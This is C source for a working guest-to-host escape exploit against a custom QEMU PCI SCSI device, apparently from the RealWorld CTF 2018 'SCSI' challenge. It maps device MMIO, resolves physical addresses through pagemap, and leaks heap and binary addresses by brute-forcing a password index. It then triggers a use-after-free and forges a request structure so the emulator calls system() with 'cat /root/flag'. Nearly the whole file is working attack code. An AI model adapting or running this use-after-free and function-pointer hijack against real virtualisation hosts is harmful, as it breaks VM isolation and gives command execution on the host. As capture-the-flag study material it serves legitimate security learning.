#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/io.h>

#include "./scsi.h"

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)

int fd, mmio_fd;
void *mmio_mem;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    size_t offset;

    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;

    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

int init_mmio() {

    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd < 0) {
        perror("open pci");
        return -1;
    }

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem < 0) {
        perror("mmap mmio_mem");
        return -1;
    }
    printf("mmio_mem: 0x%lx\n", (size_t) mmio_mem);

    return 0;
}

/* MMIO */
void set_io(uint32_t val) { /* clean bit 1 & set bit 2 */
    *(uint32_t *)((uint8_t *) mmio_mem + 0x0) = val;
}

void set_pwidx(uint8_t val) { /* one byte read */
    *(uint8_t *)((uint8_t *) mmio_mem + 0x4) = val;
}

void process_req(uint32_t val) {
    *(uint32_t *)((uint8_t *) mmio_mem + 0x8) = val;
}

void reset() {
    *(uint32_t *)((uint8_t *) mmio_mem + 0xc) = 0xdeadbeef;
}

void set_rega(uint32_t val) {
    *(uint32_t *)((uint8_t *) mmio_mem + 0x10) = val;
}

void set_regb(uint32_t val) {
    *(uint32_t *)((uint8_t *) mmio_mem + 0x14) = val;
}

void process_reply() {
    *(uint32_t *)((uint8_t *) mmio_mem + 0x18) = 0xdeadbeef;
}

void add_cmd_data(uint32_t val) {
    *(uint32_t *)((uint8_t *) mmio_mem + 0x1c) = val;
}

uint32_t get_state() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x0);
}

uint32_t get_high_addr() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x8);
}

uint32_t get_rega() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0xc);
}

uint32_t get_regb() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x10);
}

uint32_t get_idx() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x14);
}

uint32_t get_need() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x18);
}

uint32_t get_len() {
    return *(uint32_t *)((uint8_t *) mmio_mem + 0x1c);
}

struct CTF_req_head {
    uint8_t target_id;
    uint8_t target_bus;
    uint8_t lun;
    uint8_t pad;
    unsigned int buf_len;
    int type;
};

struct CTF_req {
    struct CTF_req_head head;
    char cmd_buf[0x200];
};

// https://uaf.io/exploitation/2018/11/22/RealworldCTF-2018-SCSI.html
// https://gist.github.com/ducphanduyagentp/2464e3b5e737cdd70c95976942c15491
int main() {
    int r = 0;
    void *userbuf;
    uint64_t phy_userbuf;

    fd = open("/proc/self/pagemap", O_RDONLY);
    if (!fd) {
        perror("open pagemap");
        return -1;
    }

    /* init MMIO */
    r = init_mmio();
    if (r == -1) {
        perror("init mmio");
        return -1;
    }

    /* allocate a user buffer */
    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (userbuf == MAP_FAILED) {
        perror("mmap userbuf");
        return -1;
    }
    mlock(userbuf, 0x1000);
    phy_userbuf = gva_to_gpa(userbuf);
    printf("userbuf: 0x%lx\n", (uint64_t) userbuf);
    printf("phy_userbuf: 0x%lx\n", phy_userbuf);

    /*
     * for DEBUG:
     * state addr = 0x555557c4bc30
     */

    /* init state for creating request */
    reset();
    uint8_t pw[4] = {'B', 'L', 'U', 'E'};
    printf("state: 0x%02x\n", get_state());
    for (int i = 0; i < 4; i++) { /* or state with 0x1 */
        set_pwidx(pw[i]);
    }
    printf("state: 0x%02x\n", get_state());

    /* set register b for further bypass */
    set_rega(phy_userbuf >> 0x20);
    set_regb(phy_userbuf & 0xffffffff);

    /* new scsi request */
    /*
     * / # cat /proc/scsi/scsi
     * Attached devices:
     * Host: scsi1 Channel: 00 Id: 00 Lun: 00
     *   Vendor: QEMU     Model: QEMU DVD-ROM     Rev: 2.5+
     *   Type:   CD-ROM                           ANSI  SCSI revision:5
     * / # lsscsi
     * [1:0:0:0]       (5)     QEMU    QEMU DVD-ROM    2.5+
     **/
    struct CTF_req_head tmp_head = {
        .target_id = 0x0, /* Id: 00 */
        .target_bus = 0x0, /* Channel: 00 */
        .lun = 0x0, /* Lun: 00 */
        .pad = 0x0, 
        .buf_len = 0x6, 
        .type = 0x0, 
    };
    struct CTF_req tmp = {
        .head = tmp_head, 
        .cmd_buf = {0}, 
    };
    tmp.cmd_buf[0] = 0x8; /* SCSI opcodes - READ_6 in `scsi_disk_dma_command` */
    tmp.cmd_buf[1] = 0x0;
    tmp.cmd_buf[2] = 0x0;
    tmp.cmd_buf[3] = 0x10;
    tmp.cmd_buf[4] = 0x04;
    tmp.cmd_buf[5] = 0x0;
    memcpy(userbuf, (void *) &tmp, sizeof(struct CTF_req));
    sleep(0.5);
    printf("[DEBUG] handle UNIT_ATTENTION to bypass condition\n");
    set_io(phy_userbuf >> 0x20);
    process_req(phy_userbuf & 0xffffffff);
    sleep(0.5);
    printf("[DEBUG] write data to dma buf\n");
    set_io(phy_userbuf >> 0x20);
    process_req(phy_userbuf & 0xffffffff);
    sleep(0.5);
    printf("[DEBUG] get a hung request because data is in dma_buf\n");
    set_io(phy_userbuf >> 0x20);
    process_req(phy_userbuf & 0xffffffff);

    /* leak address */
    sleep(0.5);
    printf("idx: 0x%02x\n", get_idx());
    uint8_t leaked_info[0x14] = {0};
    memcpy(leaked_info, pw, 4);
    for (int i = 0x4; i < 0x14; i++) {
        for (int j = 0; j < 4; j++) { /* set idx == 0 */
            set_pwidx(0xff);
        }
        for (int j = 0; j < 0x100; j++) {
            leaked_info[i] = j;
            for (int k = 0; k <= i; k++) {
                set_pwidx(leaked_info[k]);
            }
            if (get_idx() == i + 1) {
                printf("0x%02x\n", j);
                break;
            }
        }
    }
    uint64_t cur_req_addr = *(uint64_t *) &leaked_info[0x4];
    printf("cur_req_addr: 0x%lx\n", cur_req_addr);
    uint64_t ctf_dma_read_addr = *(uint64_t *) &leaked_info[0xc];
    printf("ctf_dma_read_addr: 0x%lx\n", ctf_dma_read_addr);
    uint64_t elf_base = ctf_dma_read_addr - 0x50915d;
    printf("elf_base: 0x%lx\n", elf_base);
    uint64_t system_plt = elf_base + 0x204948;
    printf("system_plt: 0x%lx\n", system_plt);

    /* trigger vul to get a dangling pointer */
    sleep(0.5);
    tmp.head.target_id = 0x1;
    tmp.head.target_bus = 0x1;
    tmp.head.lun = 0x1;
    memcpy(userbuf, (void *) &tmp, sizeof(struct CTF_req));
    printf("[DEBUG] free previous request\n");
    set_io(phy_userbuf >> 0x20);
    process_req(phy_userbuf);
    sleep(0.5);
    process_reply();

    /* create a fake request structure */
    struct SCSIRequest cur_req;
    char cmd[] = "cat /root/flag";
    memcpy((uint8_t *) &cur_req, cmd, strlen(cmd) + 1); /* &cur_req == &cmd_addr */
    /*
     * (gdb) p/x ((SCSIRequest *)0)->hba_private
     * $1 = 0x28
     * (gdb) p/x ((SCSIReqOps *)0)->get_buf
     * $2 = 0x28
     **/
    cur_req.ops = (SCSIReqOps *) cur_req_addr; /* set ops pointer */
    ((SCSIReqOps *) &cur_req)->get_buf = (uint8_t* (*)(SCSIRequest *)) system_plt; /* set get_buf pointer to system_plt */
    memcpy(userbuf, (void *) &cur_req, sizeof(struct SCSIRequest));
    printf("sizeof(struct SCSIRequest): 0x%lx\n", sizeof(struct SCSIRequest));
    /*
     * (gdb) p/x ((CTFState *)0x555557c4bc30)->cur_req
     * $1 = 0x7fffe405c000
     * (gdb) x/10gx 0x7fffe405c000-0x10
     * 0x7fffe405bff0: 0x0000000000000000      0x0000000000000205
     * 0x7fffe405c000: 0x00007fffe4055000      0x00007fffe40008d0
     * 0x7fffe405c010: 0x0000555556493980      0x0000000000000000
     * 0x7fffe405c020: 0xffffffff00000000      0x0000555557c4bc30
     * 0x7fffe405c030: 0x0000000000000000      0x0000000410000008
     **/
    add_cmd_data(0x1f8);

    /* call ctf_process_reply to get shell */
    sleep(0.5);
    printf("[DEBUG] call scsi_req_get_buf");
    /*
     * uint8_t *__cdecl scsi_req_get_buf(SCSIRequest_0 *req)
     * {
     *     return (req->ops->get_buf)(req);
     * }
     **/
    process_reply(); /* call cur_req->ops->get_buf(cur_req) */

    close(fd);
    close(mmio_fd);

    return 0;
}
